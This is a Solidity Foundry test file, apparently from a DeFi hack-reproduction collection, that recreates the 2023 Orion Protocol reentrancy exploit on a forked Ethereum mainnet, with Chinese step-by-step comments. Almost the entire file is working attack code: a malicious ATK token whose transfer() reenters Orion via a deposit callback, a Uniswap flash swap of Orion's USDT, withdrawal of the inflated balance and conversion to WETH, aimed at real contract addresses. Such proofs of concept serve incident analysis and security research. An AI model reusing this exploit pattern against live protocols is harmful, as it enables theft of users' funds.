// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "./interface.sol";

// @Analsysi
// https://twitter.com/peckshield/status/1621337925228306433
// https://twitter.com/BlockSecTeam/status/1621263393054420992
// https://www.numencyber.com/analysis-of-orionprotocol-reentrancy-attack-with-poc/
// @TX
// https://etherscan.io/tx/0xa6f63fcb6bec8818864d96a5b1bb19e8bd85ee37b2cc916412e720988440b2aa ETH
// https://bscscan.com/tx/0xfb153c572e304093023b4f9694ef39135b6ed5b2515453173e81ec02df2e2104 BSC

// similar events
// https://github.com/SunWeb3Sec/DeFiHackLabs#20221223---defrost---reentrancy
// https://github.com/SunWeb3Sec/DeFiHackLabs#20221110---dfxfinance---reentrancy


interface OrionPoolV2Factory {
    //创建交易对合约
    function createPair(address tokenA, address tokenB) external;
    //获取交易对合约地址
    function getPair(address tokenA, address tokenB) external view returns(address);
}

interface ORION {
    //swap 
    function swapThroughOrionPool(
        //tokenA[send] 
        uint112 amount_spend,
        //tokenB[receive]
        uint112 amount_receive,
        address[] calldata path,
        bool is_exact_spend
    ) external;
    //往orion存资产
    function depositAsset(address assetAddress, uint112 amount) external;
    //查询该用户在orion中的token i 资产
    function getBalance(address assetAddress, address user) external view returns (int192);
    //提取token i资产
    function withdraw(address assetAddress, uint112 amount) external;
}

contract ContractTest is Test {
    //定义地址
    IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    ORION Orion = ORION(0xb5599f568D3f3e6113B286d010d2BCa40A7745AA);
    OrionPoolV2Factory Factory = OrionPoolV2Factory(0x5FA0060FcfEa35B31F7A5f6025F0fF399b98Edf1);
    Uni_Router_V2 Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    Uni_Router_V3 RouterV3 = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);
    uint256 flashAmount;
    IERC20 ATK;

        //？ 
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);


    //setUp函数是一个公共函数，可以被调用来设置不同的标签，这些标签用于对不同的地址进行命名
    //vm是一个变量，它是一个虚拟机实例，用于在以太坊区块链上执行合约代码。在这个智能合约中，
    // vm将被用来标记和标识不同的地址。
    function setUp() public {
        //？
        cheats.createSelectFork("mainnet", 16_542_147);
        vm.label(address(USDT), "USDT");
        vm.label(address(USDC), "USDC");
        vm.label(address(Orion), "ORION");
        vm.label(address(Factory), "Factory");
        vm.label(address(ATK), "ATK");
        vm.label(address(RouterV3), "RouterV3");
        vm.label(address(Pair), "Pair");
    }

   function testExploit() public {
        deal(address(USDT), address(this), 1e6); // set the USDT balance of exploiter is 1
        deal(address(USDC), address(this), 1e6); // set the USDC balance of exploiter is 1
        ATK = new ATKToken(address(this));
        addLiquidity();
//这段代码调用了 USDT 合约的 approve() 函数，授权指定地址 Orion 可以使用当前合约账户的全部 USDT。
        address(USDT).call(abi.encodeWithSignature("approve(address,uint256)", address(Orion), type(uint256).max));

//调用 approve() 函数，授权 Orion 合约可以使用  合约部署者  的全部 USDT 和 USDC。
        USDC.approve(address(Orion), type(uint256).max);
        Orion.depositAsset(address(USDC), 500_000);

//计算可用于交易的闪电贷金额 flashAmount，即 Orion 合约中的 USDT 余额。
        flashAmount = USDT.balanceOf(address(Orion));
//调用 Pair.swap() 函数，用 flashAmount 个 USDT 在 Pair 中进行兑换操作，
        //得到等价的 WETH（Wrapped Ether）。
        Pair.swap(0, flashAmount, address(this), new bytes(1));

//将获得的 WETH 存入合约部署者的地址中，并通过 emit 语句输出合约部署者的 WETH 余额信息。
        USDTToWETH();
        emit log_named_decimal_uint(
            "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
            );
    }


    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        address[] memory path = new address[](3);
        path[0] = address(USDC);
        path[1] = address(ATK);
        path[2] = address(USDT);
        Orion.swapThroughOrionPool(10_000, 0, path, true);
        //调用 Orion.withdraw() 函数，从 Orion DEX 上提取全部 USDT 余额，减去 1 个 USDT（可能是为了防止精度误差），
        //并将其转移到当前合约账户。
        Orion.withdraw(address(USDT), uint112(USDT.balanceOf(address(Orion)) - 1));
        
        // ？ ？？？
        //调用 USDT 合约的 transfer() 函数，将 flashAmount * 1000 / 997 + 1000 个 USDT 
        // 转移给 Pair 合约，其中 flashAmount 为之前交易中获得的 USDT 数量。
        address(USDT).call(abi.encodeWithSignature("transfer(address,uint256)", address(Pair), flashAmount * 1000 / 997 + 1000));
    }

  //用于向 Uniswap V2 中添加流动，以便其他用户可以在该交易对中进行交易。
  function addLiquidity() internal {

        // 创建两个 Uniswap V2 的交易对，分别为 ATK/USDT 和 ATK/USDC。
        Factory.createPair(address(ATK), address(USDT));
        address Pair1 = Factory.getPair(address(ATK), address(USDT));
        Factory.createPair(address(ATK), address(USDC));
        address Pair2 = Factory.getPair(address(ATK), address(USDC));

        //将 5 * 1e5 个 USDT 转移给 Pair1 合约。
        address(USDT).call(abi.encodeWithSignature("transfer(address,uint256)", address(Pair1), 5 * 1e5));
        //将 50 * 1e18 个 ATK 转移给 Pair1 合约。
        ATK.transfer(address(Pair1), 50 * 1e18);

        //将 5 * 1e5 个 USDC 转移给 Pair2 合约。
        USDC.transfer(address(Pair2), 5 * 1e5);
        //将 50 * 1e18 个 ATK 转移给 Pair2 合约。
        ATK.transfer(address(Pair2), 50 * 1e18);
        //通过给定的交易对向其添加流动性，将 ATK 和 USDT 存入流动性池中。
        Uni_Pair_V2(Pair1).mint(address(this));
        //通过给定的交易对向其添加流动性，将 ATK 和 USDC 存入流动性池中。
        Uni_Pair_V2(Pair2).mint(address(this));
    }

  function deposit() external {
        Orion.depositAsset(address(USDT), uint112(USDT.balanceOf(address(this))));
    }

 function USDTToWETH() internal {
        address(USDT).call(abi.encodeWithSignature("approve(address,uint256)", address(RouterV3), type(uint256).max));
        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: address(USDT),
            tokenOut: address(WETH),
            fee: 3000,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: USDT.balanceOf(address(this)),
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        RouterV3.exactInputSingle(_Params);
    }
}

contract ATKToken is IERC20 {
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "ATKToken";
    string public symbol = "ATK";
    uint8 public decimals = 18;
    address public exp;
    IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    ORION Orion = ORION(0xb5599f568D3f3e6113B286d010d2BCa40A7745AA);

    constructor(address exploiter) {
        mint(100 * 1e18);
        exp = exploiter;
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        if (USDT.balanceOf(exp) > 1e6) {
            exp.call(abi.encodeWithSignature("deposit()"));
        }
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        allowance[sender][msg.sender] -= amount;
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function mint(uint256 amount) public {
        balanceOf[msg.sender] += amount;
        totalSupply += amount;
        emit Transfer(address(0), msg.sender, amount);
    }

    function burn(uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;
        emit Transfer(msg.sender, address(0), amount);
    }

    function withdraw(uint256 wad) external{}
    function deposit(uint256 wad) external returns (bool){}
    function owner() external view returns (address){}
}

